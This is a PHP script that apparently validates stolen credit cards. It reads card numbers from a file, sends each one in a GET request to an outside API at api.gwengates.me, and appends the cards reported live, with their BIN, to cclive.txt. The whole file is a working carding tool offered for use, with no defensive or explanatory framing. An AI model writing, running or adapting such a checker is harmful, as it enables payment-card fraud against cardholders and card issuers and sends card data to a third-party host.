<?php
error_reporting(0);

$data = explode("\n", str_replace("\r", "", file_get_contents($argv[1])));
$jumlah = count($data);
answer:
    if (empty(file_get_contents($argv[1]))):
        echo "$ Looks like your file is empty, i'll wait until you finish then type 'y' to continue: ";
        $emptyfill = trim(fgets(STDIN));
        if ($emptyfill !== "y"):
            goto answer;
        else:
            if (empty(file_get_contents($argv[1]))) exit("$ Bro you're such a beautiful baby girl, don't try to fool me and let's try again ;)");
            goto continues;
        endif;
    endif;
continues:
echo "$ Total: $jumlah List" . PHP_EOL;

for ($a = 0;$a < $jumlah;$a++)
{

    ulang:
    $no = $a + 1;
    echo "$ [$no/$jumlah] $data[$a] => ";
    $cek = ngecek($data[$a]);

    if ($cek['error']==0)
    {
        file_put_contents("cclive.txt", $data[$a] ." - ". $cek['bin'] ."\n", FILE_APPEND);
        echo "\033[1;32m".$cek['msg']." - ".$cek['bin']."\033[0m\n";
    }
    elseif ($cek['error']==2)
    {
        echo "\033[1;31m".$cek['msg']."\033[0m\n";

    }
    elseif ($cek['error']==5)
    {
        echo "\033[1;36m".$cek['status']."\033[0m\n";
        goto ulang;
    }
    elseif ($cek['error']==3)
    {
        echo "\033[1;36mCard Expired\033[0m\n";
    }
    elseif ($cek['error']==1)
    {
        echo "\033[1;33mUncheck contact Paman\033[0m\n";
    }
    else
    {
        echo "\033[1;33mUnable to connect to API\033[0m\n";
    }
}

function ngecek($cece)
{

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'http://api.gwengates.me/ngecek.php?cc='.$cece);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    $headers = array();
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    return json_decode($result, true);
    curl_close($ch);
}
